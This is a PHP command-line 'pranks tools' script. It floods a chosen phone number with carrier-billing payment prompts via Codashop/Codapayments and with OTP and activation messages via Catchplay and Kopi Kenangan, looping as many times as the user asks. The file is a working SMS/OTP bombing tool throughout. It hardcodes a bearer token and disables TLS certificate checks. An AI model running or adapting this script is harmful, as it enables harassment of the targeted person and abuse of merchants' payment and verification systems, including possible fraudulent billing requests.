<?php  

error_reporting(1);


date_default_timezone_set('Asia/Jakarta');

echo "[+] project info : pranks tools \n";
echo "[+] created by xdrsyah \n \n";
echo "[1] megaxus {xl} \n";
echo "[2] megaxus {telkomsel} \n";
echo "[3] megaxus {three} \n";
echo "[4] megaxus {indosat} \n";
echo "[5] catchplay \n";
echo "[6] mantan {limit} \n";
echo "[?] opsi : ";
$opsi = trim(fgets(STDIN));

if ($opsi == 1) {
	echo "\t [?] phone : ";
	$phone = trim(fgets(STDIN));
	echo "\t [?] jumlah : ";
	$jmlh = trim(fgets(STDIN));
	
	for ($i = 0; $i < $jmlh ; $i++) {
		
		$curl = curl('https://www.codashop.com/id/initPayment.action');
$cfduid = get_between($curl, ' __cfduid', ';');
$JSESSIONID = get_between($curl, 'JSESSIONID', ';');
$AWSELB = get_between($curl, 'AWSELB', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.codashop.com/id/initPayment.action');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "voucherPricePoint.id=436&voucherPricePoint.price=760000&voucherPricePoint.variablePrice=0&email=sgbteamus%40gmail.com&n=15%2F1%2F2020-1816&userVariablePrice=0&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ%3D%3D&voucherTypeName=Inventary");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/plain, */*; q=0.01';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.codashop.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.codashop.com/id/megaxus-mi-cash-voucher';
$headers[] = "Cookie: __cfduid=$cfduid; shop-lang=in_ID; JSESSIONID=$JSESSIONID; checksum=52208048; AWSELB=$AWSELB;";
$headers[] = 'Te: Trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
if ($json->success == 1) {
	$txnId = $json->txnId;
	$curl = curl("https://airtime.codapayments.com/airtime/checkout?host_url=https%3A%2F%2Fwww.codashop.com%2Fid%2Fmegaxus-mi-cash-voucher&txn_id=$txnId");
$ex = explode("Set-Cookie: ", $curl);
$land = get_between($ex[4], 'land_url=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://airtime.codapayments.com/airtime/msisdn');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "TxnId=$txnId&MnoId=0&submit_order=0&input_phone_number=$phone");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://airtime.codapayments.com';
$headers[] = 'Connection: keep-alive';
$headers[] = "Cookie: JSESSIONID=$JSESSIONID; land_url=\"$land\"; amfID=; language=in_ID;";
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
if (preg_match("/PAGE_FROM=WAITING&TxnId=$txnId/", $result)) {
	echo "success \n";
}else {
	echo "gagal \n";
}


}
	}

}

if ($opsi == 2) {

	echo "\t [?] nomer : ";
	$phone = trim(fgets(STDIN));
	echo "\t [?] jumlah : ";
	$jmlh = trim(fgets(STDIN));

	for ($i = 0; $i < $jmlh ; $i++) {
		
		$curl = curl('https://www.codashop.com/id/megaxus-mi-cash-voucher');
$ex = explode("Set-Cookie: ", $curl);
$cfduid = get_between($ex[1], 'cfduid=', ';');
$JSESSIONID = get_between($ex[2], 'JSESSIONID=', ';');
$checksum = get_between($ex[5], 'checksum=', ';');
$AWSELB = get_between($ex[7], 'AWSELB=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.codashop.com/id/initPayment.action');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "voucherPricePoint.id=174&voucherPricePoint.price=35000&voucherPricePoint.variablePrice=0&email=sgbteamus%40gmail.com&n=15%2F1%2F2020-2113&userVariablePrice=0&msisdn=$phone&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ%3D%3D&voucherTypeName=Inventary&affiliateTrackingId=");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
	$headers[] = 'Accept: text/plain, */*; q=0.01';
	$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
	$headers[] = 'X-Requested-With: XMLHttpRequest';
	$headers[] = 'Origin: https://www.codashop.com';
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Referer: https://www.codashop.com/id/megaxus-mi-cash-voucher';
	$headers[] = "Cookie: __cfduid=$cfduid; shop-lang=in_ID; checksum=$checksum; JSESSIONID=$JSESSIONID; AWSELB=$AWSELB; ";
	$headers[] = 'Te: Trailers';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	curl_close($ch);
	$json = json_decode($result);
	if (preg_match("/\/waiting/", $result)) {
		echo "success \n";
}else {
	echo "gagal \n ";
}

	}
	
}

if ($opsi == 3) {
	echo "\t [?] nomer : ";
	$phone = trim(fgets(STDIN));
	echo "\t [?] jumlah : ";
	$jmlh = trim(fgets(STDIN));

	for ($i = 0; $i < $jmlh ; $i++) {
	

	$curl = curl('https://www.codashop.com/id/megaxus-mi-cash-voucher');
$ex = explode("Set-Cookie: ", $curl);
$cfduid = get_between($ex[1], 'cfduid=', ';');
$JSESSIONID = get_between($ex[2], 'JSESSIONID=', ';');
$checksum = get_between($ex[5], 'checksum=', ';');
$AWSELB = get_between($ex[7], 'AWSELB=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.codashop.com/id/initPayment.action');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "voucherPricePoint.id=510&voucherPricePoint.price=72500&voucherPricePoint.variablePrice=0&email=sgbteamus%40gmail.com&n=16%2F1%2F2020-1116&userVariablePrice=0&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ%3D%3D&voucherTypeName=Inventary&affiliateTrackingId=");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/plain, */*; q=0.01';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.codashop.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.codashop.com/id/megaxus-mi-cash-voucher';
$headers[] = "Cookie: __cfduid=$cfduid; JSESSIONID=$JSESSIONID; checksum=$checksum";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
if ($json->success == 1) {
	$txnId = $json->txnId;
	$req = curl("https://airtime.codapayments.com/airtime/checkout?host_url=https%3A%2F%2Fwww.codashop.com%2Fid%2Fmegaxus-mi-cash-voucher&txn_id=$txnId");
$ex = explode("Set-Cookie: ", $req);
$land = get_between($ex[4], 'land_url=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://airtime.codapayments.com/airtime/msisdn');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "TxnId=$txnId&MnoId=0&submit_order=0&input_phone_number=$phone");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://airtime.codapayments.com';
$headers[] = 'Connection: keep-alive';
$headers[] = "Cookie: JSESSIONID=$JSESSIONID; land_url=\"$land\"; amfID=";
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
if (preg_match("/PAGE_FROM=WAITING&TxnId=$txnId/", $result)) {
	echo "success \n";
}else {
	echo "gagal \n";
}
}

}


}

if ($opsi == 4) {

	echo "\t [?] phone : ";
	$phone = trim(fgets(STDIN));
	echo "\t [?] jumlah : ";
	$jmlh = trim(fgets(STDIN));
	
	for ($i = 0; $i < $jmlh ; $i++) {
	

	$curl = curl('https://www.codashop.com/id/megaxus-mi-cash-voucher');
$ex = explode("Set-Cookie: ", $curl);
$cfduid = get_between($ex[1], 'cfduid=', ';');
$JSESSIONID = get_between($ex[2], 'JSESSIONID=', ';');
$checksum = get_between($ex[5], 'checksum=', ';');
$AWSELB = get_between($ex[7], 'AWSELB=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.codashop.com/id/initPayment.action');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "voucherPricePoint.id=121&voucherPricePoint.price=180000&voucherPricePoint.variablePrice=0&email=sgbteamus%40gmail.com&n=18%2F1%2F2020-1748&userVariablePrice=0&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ%3D%3D&voucherTypeName=Inventary&affiliateTrackingId=");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/plain, */*; q=0.01';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.codashop.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.codashop.com/id/megaxus-mi-cash-voucher';
$headers[] = ":Cookie: shop-lang=in_ID; __cfduid=$cfduid; AWSELB=$AWSELB; JSESSIONID=$JSESSIONID; checksum=$checksum; ";
$headers[] = 'Te: Trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
if ($json->success == 1) {
	$txnId = $json->txnId;

	$req = curl("https://airtime.codapayments.com/airtime/checkout?host_url=https%3A%2F%2Fwww.codashop.com%2Fid%2Fmegaxus-mi-cash-voucher&txn_id=$txnId");
$ex = explode("Set-Cookie: ", $req);
$land = get_between($ex[4], 'land_url=', ';');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://airtime.codapayments.com/airtime/msisdn');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "TxnId=$txnId&MnoId=0&submit_order=0&input_phone_number=$phone");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://airtime.codapayments.com';
$headers[] = 'Connection: keep-alive';
$headers[] = "Cookie: JSESSIONID=$JSESSIONID; land_url=\"$land\"; language=in_ID; ";
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
if (preg_match("/WAITING&TxnId=$txnId/", $response)) {
	echo "success \n";
}else {
	echo "gagal \n";
}

}

}

}


if ($opsi == 5) {
	
	function get_token(){
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.catchplay.com/oauth?_t=1579083398571');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.catchplay.com/id/sign-up/mobile';
$headers[] = 'Te: Trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
$atok = $json->data->api->headers->Authorization;
return $atok;
}

function send($phone, $atok){

// Generated by curl-to-PHP: http://incarnate.github.io/curl-to-php/
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://sunapi.catchplay.com/accounts/activationToken?');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"cellPhone\":\"$phone\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: in-ID';
$headers[] = "Authorization: $atok";
$headers[] = 'Asiaplay-Device-Type: WEB_PC';
$headers[] = 'Asiaplay-Device-Version: 2.0.0.234';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://www.catchplay.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.catchplay.com/id/sign-up/mobile';
$headers[] = 'Te: Trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
return $json;
}

echo "\t [?] nomer : ";
$phone = trim(fgets(STDIN));
echo "\t [?] jumlah : ";
$jmlh = trim(fgets(STDIN));

for ($i = 0; $i < $jmlh ; $i++) {
$atok = get_token();
$send = send($phone, $atok);
$msg = $send->message;
print_r("$msg \n");
}

}

if ($opsi == 6) {
	
	echo "\t[?] phone : ";
$no = trim(fgets(STDIN));
echo "\t[?] jumlah : ";
$jmlh = trim(fgets(STDIN));

for ($i = 0; $i < $jmlh ; $i++) {

$phone = preg_replace("/08/", "628", $no);
	
	$rand = randStr(7);

	$body = "{\"phone\":\"00$phone\",\"marketplace_id\":90001}";
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://apps.kopikenangan.com/kk-api-kopikenangan/register');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);

$headers = array();
$headers[] = 'User-Agent: Dart/2.7 (dart:io)';
$headers[] = 'Appid: kopikenangan';
$headers[] = 'Deviceid: 3056ef212'.$rand;
// $headers[] = 'Accept-Encoding: gzip';
$headers[] = 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjI0NDMxNTg3ODksImlzcyI6ImtrLWlzc3VlciIsImRldmljZUlkIjoiMzA1NmVmMjEyYTMzZGNlMCIsImN1c3RvbWVySWQiOjAsIm1hcmtldHBsYWNlSWQiOjAsIm91dGxldENvZGUiOiIifQ.SEDqttQP4z7Ibhij-pb-g4GTghDrMgfAOCC6iMX2h6w';
$headers[] = 'Content-Type: application/json; charset=utf-8';
$headers[] = 'Versioncode: 8';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: zh-cn';
$headers[] = 'Devicetype: Android';
$headers[] = 'Version: 1.0.8';
$headers[] = 'Content-Length:'.strlen($body);
$headers[] = 'Host: apps.kopikenangan.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
if ($json->data->status_text == "Phone exists") {
		
	$bodys = "{\"phone\":\"00$phone\"}";

	$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://apps.kopikenangan.com/kk-api-kopikenangan/api/account/sendOtp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $bodys);

$headers = array();
$headers[] = 'User-Agent: Dart/2.7 (dart:io)';
$headers[] = 'Appid: kopikenangan';
$headers[] = 'Deviceid: 3056ef212'.$rand;
$headers[] = 'Accept-Encoding: gzip';
$headers[] = 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjI0NDMxNTg3ODksImlzcyI6ImtrLWlzc3VlciIsImRldmljZUlkIjoiMzA1NmVmMjEyYTMzZGNlMCIsImN1c3RvbWVySWQiOjAsIm1hcmtldHBsYWNlSWQiOjAsIm91dGxldENvZGUiOiIifQ.SEDqttQP4z7Ibhij-pb-g4GTghDrMgfAOCC6iMX2h6w';
$headers[] = 'Content-Type: application/json; charset=utf-8';
$headers[] = 'Versioncode: 8';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: zh-cn';
$headers[] = 'Devicetype: Android';
$headers[] = 'Version: 1.0.8';
$headers[] = 'Content-Length:'.strlen($bodys);
$headers[] = 'Host: apps.kopikenangan.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$respon = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$jsons = json_decode($respon);
$msg = $jsons->data->status;
print_r("$msg \n");
}else {
	$res = $json->msg;
	print_r("$res \n");
}

}

}


function curl($url, $params = null, $header = true, $httpheaders = null, $request = 'GET'){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $request);
	curl_setopt($ch, CURLOPT_HEADER, $header);
	@curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheaders);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; rv:52.0) Gecko/20100101 Firefox/52.0");
	$response = curl_exec($ch);
	return $response;
	curl_close($ch);
}

function get_between($string, $start, $end)
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    } 

    function randStr($q){
	$abc = "abcdefghijklmnopqrstuvwxyz1234567890";
	$word = " ";
	for ($i = 0; $i < $q ; $i++) {
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}


?>